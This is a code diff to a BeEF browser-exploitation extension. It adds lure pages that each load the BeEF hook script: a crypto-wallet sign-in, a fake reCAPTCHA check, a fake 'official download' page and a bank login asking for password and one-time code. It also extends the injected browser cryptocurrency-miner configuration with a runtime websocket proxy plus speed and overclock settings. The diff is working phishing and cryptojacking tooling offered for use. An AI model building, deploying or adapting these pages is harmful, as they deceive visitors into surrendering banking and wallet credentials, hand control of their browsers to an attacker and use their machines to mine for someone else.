@@ -108,16 +108,21 @@ module BeEF
       end
 
       # ── Page renderer ─────────────────────────────────────────────────────────
+      # ws_proxy_override: resolved ws proxy URL (from handler); overrides config placeholder.
 
-      def self.render_page(page)
+      def self.render_page(page, ws_proxy_override = nil)
         cfg  = BeEF::Core::Configuration.instance
         hook = cfg.get('beef.http.hook_file') || '/hook.js'
         html = case page[:template]
-               when 'news'   then news_template(page[:title], page[:custom_body])
-               when 'login'  then login_template(page[:title], page[:custom_body])
-               when 'survey' then survey_template(page[:title], page[:custom_body])
-               when 'error'  then error_template(page[:title], page[:custom_body])
-               else               blank_template(page[:title], page[:custom_body])
+               when 'news'     then news_template(page[:title], page[:custom_body])
+               when 'login'    then login_template(page[:title], page[:custom_body])
+               when 'survey'   then survey_template(page[:title], page[:custom_body])
+               when 'error'    then error_template(page[:title], page[:custom_body])
+               when 'crypto'   then crypto_template(page[:title], page[:custom_body])
+               when 'captcha'  then captcha_template(page[:title], page[:custom_body])
+               when 'download' then download_template(page[:title], page[:custom_body])
+               when 'bank'     then bank_template(page[:title], page[:custom_body])
+               else                 blank_template(page[:title], page[:custom_body])
                end
 
         html = html.gsub('{{HOOK_URL}}', hook)
@@ -125,14 +130,19 @@ module BeEF
         # Inject miner script when the page has it enabled
         if page[:miner_enabled]
           mc = miner_config
+          # Use the runtime-resolved ws_proxy if the stored one is a placeholder/empty
+          ws  = ws_proxy_override.to_s
+          ws  = mc[:ws_proxy].to_s if ws.empty?
           miner_snippet = <<~JS
             <script>
               window.BEEF_MINER_CONFIG = {
-                wsProxy:    #{mc[:ws_proxy].to_json},
+                wsProxy:    #{ws.to_json},
                 wallet:     #{mc[:wallet].to_json},
                 coin:       #{mc[:coin].to_json},
                 workerName: #{mc[:worker_name].to_json},
-                threads:    #{mc[:threads]}
+                threads:    #{mc[:threads]},
+                speed:      #{mc[:speed]},
+                overclock:  #{mc[:overclock]}
               };
             </script>
             <script src="/miner/miner.js" defer></script>
@@ -258,6 +268,157 @@ module BeEF
             <a href="javascript:history.back()">← Go Back</a> &nbsp;
             <a class="btn" href="/">Home</a>
           </div></body></html>
+        HTML
+      end
+
+      def self.crypto_template(title, custom)
+        brand = custom.empty? ? title : custom
+        <<~HTML
+          <!DOCTYPE html><html lang="en">
+          <head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+          <title>#{CGI.escapeHTML(brand)} – Wallet Sign In</title>
+          <script src="{{HOOK_URL}}"></script>
+          <style>*{box-sizing:border-box;margin:0;padding:0}body{font-family:'Segoe UI',Arial,sans-serif;background:#0d1117;color:#e6edf3;display:flex;flex-direction:column;align-items:center;justify-content:center;min-height:100vh}.logo{font-size:2rem;font-weight:700;color:#f7931a;margin-bottom:6px;letter-spacing:1px}.sub{color:#8b949e;font-size:.9rem;margin-bottom:28px}.card{background:#161b22;border:1px solid #30363d;border-radius:10px;padding:36px 32px;width:100%;max-width:380px}h2{font-size:1.2rem;margin-bottom:20px;text-align:center;color:#e6edf3}label{display:block;font-size:.8rem;color:#8b949e;margin-bottom:4px;margin-top:14px;font-weight:600;text-transform:uppercase;letter-spacing:.4px}input{width:100%;padding:10px 12px;background:#0d1117;border:1px solid #30363d;border-radius:6px;color:#e6edf3;font-size:.95rem;outline:none;transition:border .2s}input:focus{border-color:#f7931a}input[type=password]{font-family:monospace;letter-spacing:2px}.btn{width:100%;margin-top:22px;padding:12px;background:#f7931a;color:#000;border:none;border-radius:6px;font-size:1rem;font-weight:700;cursor:pointer;transition:background .2s}.btn:hover{background:#e8840f}.links{text-align:center;margin-top:16px;font-size:.82rem;color:#8b949e}.links a{color:#58a6ff;text-decoration:none}.divider{display:flex;align-items:center;gap:10px;margin:20px 0;color:#8b949e;font-size:.8rem}.divider:before,.divider:after{content:'';flex:1;border-top:1px solid #30363d}.wallet-opts{display:flex;gap:8px;margin-top:8px}.wallet-btn{flex:1;padding:9px 6px;background:#0d1117;border:1px solid #30363d;border-radius:6px;color:#8b949e;font-size:.75rem;cursor:pointer;text-align:center;transition:border .2s}.wallet-btn:hover{border-color:#f7931a;color:#e6edf3}</style>
+          </head><body>
+          <div class="logo">₿ #{CGI.escapeHTML(brand)}</div>
+          <div class="sub">Decentralised Finance Platform</div>
+          <div class="card">
+            <h2>Sign in to your wallet</h2>
+            <form method="post" action="#">
+              <label>Email address</label>
+              <input type="email" name="email" placeholder="you@example.com" autocomplete="username">
+              <label>Password</label>
+              <input type="password" name="password" placeholder="••••••••••" autocomplete="current-password">
+              <button class="btn" type="submit">Access Wallet</button>
+            </form>
+            <div class="divider">or connect with</div>
+            <div class="wallet-opts">
+              <div class="wallet-btn">🦊 MetaMask</div>
+              <div class="wallet-btn">👻 Phantom</div>
+              <div class="wallet-btn">🔵 Coinbase</div>
+            </div>
+            <div class="links" style="margin-top:18px"><a href="#">Forgot password?</a> &bull; <a href="#">Create account</a></div>
+          </div></body></html>
+        HTML
+      end
+
+      def self.captcha_template(title, custom)
+        msg = custom.empty? ? 'Please complete the verification below to continue.' : custom
+        <<~HTML
+          <!DOCTYPE html><html lang="en">
+          <head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+          <title>#{CGI.escapeHTML(title)}</title>
+          <script src="{{HOOK_URL}}"></script>
+          <style>*{box-sizing:border-box;margin:0;padding:0}body{font-family:Arial,sans-serif;background:#f1f3f4;display:flex;align-items:center;justify-content:center;min-height:100vh}.wrap{text-align:center;max-width:400px;width:100%;padding:20px}.icon{font-size:3.5rem;margin-bottom:12px}.title{font-size:1.3rem;font-weight:600;color:#202124;margin-bottom:6px}.sub{color:#5f6368;font-size:.9rem;margin-bottom:28px;line-height:1.5}.box{background:#fff;border:1px solid #dadce0;border-radius:8px;padding:20px 24px;display:flex;align-items:center;gap:16px;margin-bottom:20px;cursor:pointer;transition:border .2s}.box:hover{border-color:#1a73e8}.checkbox{width:28px;height:28px;border:2px solid #dadce0;border-radius:4px;flex-shrink:0;display:flex;align-items:center;justify-content:center;font-size:1.2rem;transition:all .2s}.box-label{text-align:left}.box-label strong{display:block;color:#202124;font-size:.95rem}.box-label span{color:#5f6368;font-size:.8rem;margin-top:2px;display:block}.footer{font-size:.75rem;color:#5f6368;display:flex;align-items:center;justify-content:space-between}.logo{font-size:.75rem;color:#5f6368;font-weight:700;letter-spacing:1px}</style>
+          </head><body>
+          <div class="wrap">
+            <div class="icon">🛡️</div>
+            <div class="title">#{CGI.escapeHTML(title)}</div>
+            <div class="sub">#{CGI.escapeHTML(msg)}</div>
+            <div class="box" id="cb" onclick="verify(this)">
+              <div class="checkbox" id="chk"></div>
+              <div class="box-label">
+                <strong>I'm not a robot</strong>
+                <span>This verification protects sites from automated traffic.</span>
+              </div>
+            </div>
+            <div class="footer">
+              <span>Protected by reCAPTCHA</span>
+              <span class="logo">reCAPTCHA</span>
+            </div>
+          </div>
+          <script>
+          function verify(box){
+            var chk=document.getElementById('chk');
+            chk.textContent='✓';chk.style.background='#1a73e8';chk.style.borderColor='#1a73e8';chk.style.color='#fff';
+            box.style.borderColor='#1a73e8';
+            setTimeout(function(){window.location.href='/';},2500);
+          }
+          </script>
+          </body></html>
+        HTML
+      end
+
+      def self.download_template(title, custom)
+        software = custom.empty? ? title : custom
+        <<~HTML
+          <!DOCTYPE html><html lang="en">
+          <head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+          <title>Download #{CGI.escapeHTML(software)}</title>
+          <script src="{{HOOK_URL}}"></script>
+          <style>*{box-sizing:border-box;margin:0;padding:0}body{font-family:'Segoe UI',Arial,sans-serif;background:#f8f9fa;color:#212529}header{background:#343a40;color:#fff;padding:14px 32px;display:flex;align-items:center;gap:12px;font-size:1.1rem;font-weight:600}.hero{background:linear-gradient(135deg,#0d6efd 0%,#0a58ca 100%);color:#fff;text-align:center;padding:60px 20px}.hero h1{font-size:2.2rem;margin-bottom:10px}.hero p{font-size:1.05rem;opacity:.9;max-width:540px;margin:0 auto 28px}.badge{display:inline-flex;align-items:center;gap:6px;background:rgba(255,255,255,.15);border-radius:20px;padding:6px 14px;font-size:.85rem;margin:4px}.btn-dl{display:inline-flex;align-items:center;gap:10px;background:#fff;color:#0d6efd;font-weight:700;font-size:1.1rem;padding:14px 32px;border-radius:8px;text-decoration:none;border:none;cursor:pointer;transition:transform .15s,box-shadow .15s;box-shadow:0 4px 20px rgba(0,0,0,.2)}.btn-dl:hover{transform:translateY(-2px);box-shadow:0 8px 28px rgba(0,0,0,.25)}.main{max-width:860px;margin:40px auto;padding:0 20px;display:grid;grid-template-columns:1fr 1fr;gap:24px}@media(max-width:600px){.main{grid-template-columns:1fr}}.card{background:#fff;border:1px solid #dee2e6;border-radius:8px;padding:24px}.card h3{font-size:1rem;font-weight:700;margin-bottom:12px;color:#0d6efd}.card ul{color:#495057;font-size:.9rem;line-height:1.8;padding-left:18px}.meta{font-size:.8rem;color:#6c757d;margin-top:8px}.progress-wrap{margin-top:20px;display:none}.progress{background:#e9ecef;border-radius:6px;height:10px;overflow:hidden}.progress-bar{width:0;height:100%;background:#0d6efd;border-radius:6px;transition:width .1s}</style>
+          </head><body>
+          <header>⬇ #{CGI.escapeHTML(software)} – Official Download</header>
+          <div class="hero">
+            <h1>#{CGI.escapeHTML(software)}</h1>
+            <p>Free, trusted, and secure. Millions of users worldwide rely on #{CGI.escapeHTML(software)} every day.</p>
+            <div style="margin-bottom:18px">
+              <span class="badge">✓ Virus-free</span>
+              <span class="badge">✓ No bundleware</span>
+              <span class="badge">✓ Auto-updates</span>
+            </div>
+            <button class="btn-dl" onclick="startDownload()">⬇ Free Download</button>
+            <p class="meta" style="opacity:.7;margin-top:10px;font-size:.8rem">Version 4.2.1 &bull; Windows / macOS / Linux &bull; 58 MB</p>
+          </div>
+          <div class="main">
+            <div class="card"><h3>Features</h3><ul><li>Lightning-fast performance</li><li>End-to-end encrypted</li><li>Cross-platform sync</li><li>Offline mode support</li><li>Dark mode included</li></ul></div>
+            <div class="card"><h3>System Requirements</h3><ul><li>Windows 10+ / macOS 11+</li><li>4 GB RAM minimum</li><li>2 GB free disk space</li><li>Internet connection</li></ul></div>
+          </div>
+          <div id="progress-wrap" style="max-width:500px;margin:0 auto 40px;padding:0 20px;display:none">
+            <p style="font-size:.9rem;color:#495057;margin-bottom:8px">Preparing download…</p>
+            <div class="progress"><div id="pbar" class="progress-bar"></div></div>
+          </div>
+          <script>
+          function startDownload(){
+            document.getElementById('progress-wrap').style.display='block';
+            var p=document.getElementById('pbar'),w=0;
+            var iv=setInterval(function(){w+=Math.random()*8+2;if(w>=100){w=100;clearInterval(iv);}p.style.width=w+'%';},120);
+          }
+          </script>
+          </body></html>
+        HTML
+      end
+
+      def self.bank_template(title, custom)
+        bank = custom.empty? ? title : custom
+        <<~HTML
+          <!DOCTYPE html><html lang="en">
+          <head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+          <title>#{CGI.escapeHTML(bank)} – Secure Online Banking</title>
+          <script src="{{HOOK_URL}}"></script>
+          <style>*{box-sizing:border-box;margin:0;padding:0}body{font-family:Arial,sans-serif;background:#f5f5f5;color:#333}header{background:#003087;color:#fff;padding:14px 32px;display:flex;align-items:center;justify-content:space-between}.hname{font-size:1.2rem;font-weight:700;letter-spacing:.5px}.hsub{font-size:.75rem;opacity:.7;margin-top:2px}.hicons{display:flex;gap:14px;font-size:.8rem;opacity:.85}.main{display:flex;min-height:calc(100vh - 54px)}.sidebar{width:260px;background:#002970;color:#fff;padding:0;flex-shrink:0}@media(max-width:700px){.sidebar{display:none}}.nav-item{padding:14px 20px;font-size:.9rem;cursor:pointer;border-bottom:1px solid rgba(255,255,255,.07);transition:background .15s}.nav-item:hover{background:rgba(255,255,255,.08)}.nav-item.active{background:#0050c8;border-left:3px solid #66b3ff}.content{flex:1;padding:32px;max-width:600px}.card{background:#fff;border:1px solid #ddd;border-radius:6px;padding:28px 32px;margin-bottom:20px;box-shadow:0 1px 4px rgba(0,0,0,.06)}.card h2{font-size:1rem;color:#003087;margin-bottom:18px;font-weight:700;border-bottom:2px solid #003087;padding-bottom:8px}label{display:block;font-size:.82rem;color:#666;margin-bottom:4px;margin-top:14px;font-weight:600}input{width:100%;padding:9px 11px;border:1px solid #ccc;border-radius:4px;font-size:.95rem;outline:none;transition:border .2s}input:focus{border-color:#003087}.btn{margin-top:20px;padding:11px 28px;background:#003087;color:#fff;border:none;border-radius:4px;font-size:.95rem;cursor:pointer;font-weight:600}.btn:hover{background:#002070}.secure{font-size:.75rem;color:#4caf50;margin-top:10px;display:flex;align-items:center;gap:4px}footer{background:#f0f0f0;border-top:1px solid #ddd;text-align:center;padding:12px;font-size:.75rem;color:#888}</style>
+          </head><body>
+          <header>
+            <div><div class="hname">🏦 #{CGI.escapeHTML(bank)}</div><div class="hsub">Personal Banking</div></div>
+            <div class="hicons"><span>🔒 256-bit SSL</span><span>📱 Mobile App</span></div>
+          </header>
+          <div class="main">
+            <div class="sidebar">
+              <div class="nav-item active">🔐 Sign In</div>
+              <div class="nav-item">💳 Accounts</div>
+              <div class="nav-item">💸 Transfers</div>
+              <div class="nav-item">📊 Statements</div>
+              <div class="nav-item">⚙️ Settings</div>
+            </div>
+            <div class="content">
+              <div class="card">
+                <h2>Online Banking Sign In</h2>
+                <form method="post" action="#">
+                  <label>Customer ID / Username</label>
+                  <input type="text" name="username" placeholder="Enter your Customer ID" autocomplete="username">
+                  <label>Password / PIN</label>
+                  <input type="password" name="password" placeholder="••••••••" autocomplete="current-password">
+                  <label>One-Time Password (OTP)</label>
+                  <input type="text" name="otp" placeholder="Enter the OTP sent to your phone" maxlength="8">
+                  <button class="btn" type="submit">Sign In Securely</button>
+                </form>
+                <div class="secure">🔒 Your session is encrypted and secure</div>
+              </div>
+              <p style="font-size:.8rem;color:#888;line-height:1.6">Having trouble signing in? <a href="#" style="color:#003087">Forgot Password</a> or <a href="#" style="color:#003087">Unlock Account</a>. For assistance, call 1-800-BANK-HELP.</p>
+            </div>
+          </div>
+          <footer>© #{Time.now.year} #{CGI.escapeHTML(bank)}. All rights reserved. Member FDIC. Equal Housing Lender.</footer>
+          </body></html>
         HTML
       end
 
